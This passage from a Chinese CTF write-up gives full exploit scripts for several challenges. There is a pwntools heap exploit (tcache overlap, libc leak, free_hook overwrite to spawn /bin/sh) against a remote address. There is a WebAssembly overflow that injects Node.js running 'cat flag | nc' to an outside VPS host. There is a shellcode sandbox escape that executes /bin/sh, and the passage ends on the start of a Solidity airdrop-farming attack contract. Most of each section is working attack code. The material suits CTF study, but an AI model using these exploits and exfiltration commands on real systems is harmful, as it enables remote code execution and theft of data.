  6. 重新拿回来就能 泄露 libc 
  7. 由于前面的操作，使得我们拥有了另外一个指向这个chunk 的指针，所以只要修改到 free hook 就行。
    #coding:utf-8
    from swpwn import *
    # from pwn import *
    io,elf,libc= init_pwn('./houseofAtum','libc.so.6',remote_detail=('60.205.224.216',9999))
    libc_base = 0x00007ffff7ddc000
    free_hook_offset = 0x3ed8e8
    system_offset = 0x4f440 
    def add(msg):
        sla('Your choice:','1')
        sa('Input the content:',str(msg))
    def edit(idx,msg):
        sla('Your choice:','2')
        sla('Input the idx:',str(idx))
        sa('Input the content:',str(msg))
    def delete(idx,clear):
        sla('Your choice:','3')
        sla('Input the idx',str(idx))
        sla('Clear?(y/n):',str(clear))
    def show(idx):
        sla('Your choice:','4')
        sla('Input the idx:',str(idx))
    add('A')
    add('B'*2)
    #  leak heap
    delete('0','n')
    delete('1','n')
    show(1)
    print ru('Content:')
    heap_base = raddr()
    heap_base = heap_base - 0x260
    lg('heap_base: ',heap_base)
    # raw_input('wait to debug')
    for i in range(5):
        delete(0,'n')
    delete(1,'y')
    delete(0,'y')
    # raw_input('wait to debug')
    payload = "a"*0x30
    payload += p64(0) + p64(0xa1)
    payload += p64(heap_base + 0x30)
    add(payload) #0
    add('1') #
    #next tcache = heapbase + 0x10
    delete(1, "y")
    #(0x50)   tcache_entry[3]: 0x555555757030
    #(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
    add('1',)
    delete(0,'y')
    #(0x50)   tcache_entry[3]: 0x555555757260 (overlap chunk with 0x555555757250(freed) )
    #(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
    payload = p64(0)*7 + p64(heap_base + 0x10)
    edit(1, payload)
    # write tcache_entry[3]: 0x555555757060 ---> 0x555555757010
    #(0x50)   tcache_entry[3]: 0x555555757010
    #(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
    add(p8(0x11))
    #now free chunk 0x555555757000 to unsortbin
    #addr                prev                size                 status              fd                bk
    #0x555555757000      0x0                 0x250                Used                None              None
    #0x555555757250      0x0                 0x50                 Freed                0x0              None
    #0x5555557572a0      0x0                 0x50                 Used                None              None
    for i in range(7):
        delete(0, "n")
    delete(0, "y")
    #now mov 0x555555757000 -> tcache
    payload = p64(0)*7 + p64(heap_base + 0x10)
    edit(1, payload)
    #(0x50)   tcache_entry[3]: 0x555555757010 (overlap chunk with 0x555555757000(freed) )
    #(0xa0)   tcache_entry[8]: 0x5555557572a0 (overlap chunk with 0x555555757250(freed) )
    #(0x250)   tcache_entry[35]: 0x555555757010 (overlap chunk with 0x555555757000(freed) )
    add(p8(0x11))
    show(0)
    print ru('Content:')
    libc_base = raddr()+ 0xc143ef# - 0x3ebca0
    lg('libc_base: ',libc_base)
    free_hook  = libc_base + free_hook_offset
    system_addr = libc_base + system_offset
    delete(0,'y')
    payload = p64(0)*7 + p64(free_hook-8)
    edit(1, payload)
    raw_input('wait to debug')
    add("/bin/sh\x00" + p64(system_addr))
    raw_input('wait to debug')
    ru('Your choice:')
    sl('3')
    ru('Input the idx:')
    sl('0')
    io.interactive()
### easywasm
这道题的主要分析难度在于Wasm文件的逆向。
分析wasm文件可以发现其中包括一个奇怪的导入函数`_emscripten_run_script`，查阅文档可知，这个API是用于在C编译出的Wasm中动态执行JS函数。
查了一下交叉引用发现没有函数调用了`_emscripten_run_script`这个API。
想起今年BlackHat出了一篇关于Wasm漏洞的文章，[Security Chasms of WASM - Black
Hat](https://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf)，里面提到了一些基本的Wasm攻击思路。
基本路径是：寻找内存覆盖->覆盖关键内存变量（函数指针）->远程代码执行XSS（在nodejs上也可以说是getshell）。
    +------------------------------+
    |                              |
    |        index(4 byte)         |
    |                              |
    +------------------------------+
    |                              |
    |        isused(4 byte)        |
    |                              |
    +------------------------------+
    |                              |
    |                              |
    |                              |
    |         name(60 byte)        |
    |                              |
    |                              |
    |                              |
    |                              |
    +------------------------------+
    |                              |
    |        istutor(4 byte)       |
    |                              |
    +------------------------------|
在`add_person`中name长度不受限制，但是istutor参数是在name之后赋值的。  
在`change_name`中name长度依然不受限制，所以可以覆盖istutor。  
在`intro`函数中包含了一个函数指针,而具体的调用函数则与istutor的值有关，我们发现当istutor的低字节为5时，istutor调用的是`_emscripten_run_script`，剩下的就很简单了。
    from __future__ import print_function
    from pwn import *
    import requests
    # remote_url = 'http://127.0.0.1:23333/'
    remote_url = 'http://39.96.13.247:9999/'
    req = requests.get(remote_url + 'add_person/?name=hello')
    print('add_person:', req.text)
    person_id = int(req.text.split('=')[1])
    script = """
    const exec = require('child_process').exec;
    const child = exec('cat flag | nc vps.dagebiegaowo.com 8888',
        (error, stdout, stderr) => {
    });
    """
    script = script.replace('\n', '')
    print('script:', script)
    params = {
        'id': person_id,
        'name': '/*' + '5'*60 + '*/' + script
    }
    req = requests.get(remote_url + 'change_name/', params)
    print('change name:', req.text)
    req = requests.get(remote_url + 'intro/?id={}'.format(person_id))
    print('intro:', req.text)
以上。
## Misc
### easysandbox
    print("[+]escape the sandbox!")
        sys.stdout.flush()
        ELF = sys.stdin.readline()[:-1]
        print(len(ELF))
        if (len(ELF) > 1048576):
            print("[-]ELF too big!")
            return
        elfname = tofile(ELF)
        if elfname == "":
            print("[-]base64 please!")
            sys.stdout.flush()
            return
        os.system("chmod +x %s" % elfname)
        io = process(elfname, env=env)
        io.interactive()
进到沙箱后，先是判断了下大小，然后 hook 了下 `env = {"LD_PRELOAD": os.path.join(os.getcwd(),
"scf.so")}`,有点像以前Pwn 通防的套路。
    v11 = ubp_av;
      v10 = init;
      v9 = fini;
      v8 = rtld_fini;
      puts("hook __libc_start_main success!");
      handle = dlopen("libc.so.6", 1);
      if ( !handle )
        exit(1);
      v13 = (__int64 (__fastcall *)(int (__fastcall *)(int, char **, char **), _QWORD, char **, void (*)(void), void (*)(void), void (*)(void), void *, __int64))dlsym(handle, "__libc_start_main");
      if ( !v13 )
        exit(2);
      if ( (unsigned int)install_syscall_filter() )
        exit(3);
      return v13(main, (unsigned int)argc, v11, v10, v9, v8, stack_end, v14);
会发现其实是，如果调用libc.so.6 他会进行相关check ，那最简单的方法就是...写个汇编 ...然后编译
    $ cat 1.asm
    section .text
      global _start
        _start:
          push rax
          xor rdx, rdx
          xor rsi, rsi
          mov rbx,'/bin//sh'
          push rbx
          push rsp
          pop rdi
          mov al, 59
          syscall
编译后，发送过去即可。
## BlockChain
### Fake3d
薅羊毛攻击：
    contract father {
        function father() payable {}
        Son son;
        function attack(uint256 times) public {
            for(uint i=0;i<times;i++){
                son = new Son();
            }
        }